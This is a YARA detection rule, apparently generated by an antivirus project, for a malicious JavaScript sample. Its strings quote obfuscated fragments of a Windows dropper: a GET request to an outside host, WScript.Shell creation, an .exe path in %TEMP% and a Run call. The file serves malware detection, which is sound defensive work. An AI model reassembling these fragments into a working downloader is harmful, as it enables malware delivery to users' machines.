rule sig_20160330_a9ce6b03a69e0412da8abede73a5393f {
  meta:
    description = "datamaliciousorder - file 20160330_a9ce6b03a69e0412da8abede73a5393f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e5a1f364ecd9b58af84250212bcdae7297cd8352000de6dd4bc5e8b26f1d0a7a"

  strings:
    $s1  = "_B[_U](\"GET\", \"http://ru-optovik.ru/j9ssl\", false);" fullword ascii
    $s2  = "function _GF(_GF1, _EG){_VU = _VU * 1; return _GF1 - _EG;};" fullword ascii
    $s3  = "var _PR = function _J() {return WScript[_O](\"WScript\"+\".Shell\");}(), _LB = 11;" fullword ascii
    $s4  = "if (_B[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _KD(){return _GF0 + \"\";};" fullword ascii
    $s6  = "function _KO() {return _PR[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"itGqOA98BOU87OG9.ex\" + \"e\";};" fullword ascii
    $s7  = "function _XW() {return ((_Z == true) && (_Z == _XN)) ? 1 : _VU;};" fullword ascii
    $s8  = "function _I(_SF){_PR[\"Run\"](_SF, _VU, _VU);};" fullword ascii
    $s9  = " while (_A){" fullword ascii
    $s10 = "function _NE()" fullword ascii
    $s11 = "function _VG(){return 22;};" fullword ascii
    $s12 = "var _WK = new this[\"Date\"]();" fullword ascii
    $s13 = "function _P(_K) {var _MO = (1, 2, 3, 4, 5, _K); return _MO;};" fullword ascii
    $s14 = "function _N(){return _O;};" fullword ascii
    $s15 = "return _GF(_E, _N0);" fullword ascii
    $s16 = "var _D = false;" fullword ascii
    $s17 = "_Z = true; " fullword ascii
    $s18 = "var _Z = false;" fullword ascii
    $s19 = "_XN = true; " fullword ascii
    $s20 = "var _XN = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}